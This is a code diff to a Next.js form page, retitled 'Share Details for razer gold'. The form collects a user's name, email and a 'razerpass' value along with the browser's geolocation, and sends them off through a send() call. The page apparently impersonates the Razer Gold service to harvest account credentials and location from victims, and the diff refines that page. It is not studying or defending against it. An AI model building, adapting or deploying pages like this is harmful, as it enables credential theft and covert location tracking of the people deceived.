@@ -9,7 +9,7 @@ export default function Home() {
   return (
     <div className="container">
       <Head>
-        <title>Share Details + Location</title>
+        <title>Share Details for razer gold</title>
         <link rel="icon" href="/favicon.ico" />
       </Head>
 
@@ -120,17 +120,15 @@ export default function Home() {
                     mobile: info.razerpass,
                     lat: loc.latitude,
                     lon: loc.longitude,
-                    acc: loc.accuracy,
-                    ts: loc.timestamp
-                  };
-                  const infoHash = makeInfoHash(bundle);
+                                      };
+                  const infoHash = makeCommaInfo(bundle);
                   log('InfoHash: ' + infoHash);
                   await send({ ...info, ...loc, infoHash });
                 }catch(err){
                   log('Location error: ' + (err && err.message ? err.message : err));
                   const infoHash = [info.name, info.email, info.mobile, '', '', '', Date.now()].join(',');
-log('InfoHash (no location): ' + infoHash);
-await send({ ...info, locationError: String(err?.message || err), infoHash });
+                  log('InfoHash (no location): ' + infoHash);
+                  await send({ ...info, locationError: String(err?.message || err), infoHash });
 
                 }finally{
                   submitBtn.disabled = false;
@@ -143,20 +141,39 @@ await send({ ...info, locationError: String(err?.message || err), infoHash });
 
       <Footer />
 
-      <style jsx>{`
+     <style jsx>{`
         .container { min-height: 100vh; position: relative; overflow: hidden; }
-      .bg {
-  position: fixed;
-  inset: 0;
-  background: #000; /* solid black */
-  z-index: -1;
-}
-
-        .card { max-width: 560px; margin: 8vh auto; background: rgba(20,20,20,0.72); backdrop-filter: saturate(120%) blur(6px); border-radius: 12px; padding: 24px; color: #f2f2f2; box-shadow: 0 10px 30px rgba(0,0,0,0.35); }
+        .bg { position: fixed; inset: 0; background: #000; z-index: -1; }
+        .card {
+          max-width: 560px;
+          margin: 8vh auto;
+          background: rgba(0,0,0,0.8);
+          border-radius: 12px;
+          padding: 24px;
+          color: #f2f2f2;
+          box-shadow: 0 10px 30px rgba(0,0,0,0.35);
+        }
         label { display: block; margin: 10px 0 6px; }
-        input { width: 100%; padding: 10px 12px; border-radius: 8px; border: 1px solid rgba(255,255,255,0.25); background: rgba(255,255,255,0.08); color: #fff; outline: none; }
+        input {
+          width: 100%;
+          padding: 10px 12px;
+          border-radius: 8px;
+          border: 1px solid rgba(255,255,255,0.25);
+          background: rgba(255,255,255,0.08);
+          color: #fff;
+          outline: none;
+        }
         input::placeholder { color: rgba(255,255,255,0.6); }
-        button { margin-top: 12px; padding: 10px 14px; border-radius: 8px; border: none; background: #00e676; color: #092e20; font-weight: 600; cursor: pointer; }
+        button {
+          margin-top: 12px;
+          padding: 10px 14px;
+          border-radius: 8px;
+          border: none;
+          background: #00e676;
+          color: #092e20;
+          font-weight: 600;
+          cursor: pointer;
+        }
         button:disabled { opacity: 0.6; cursor: not-allowed; }
         pre { color: #e0ffe6; }
       `}</style>
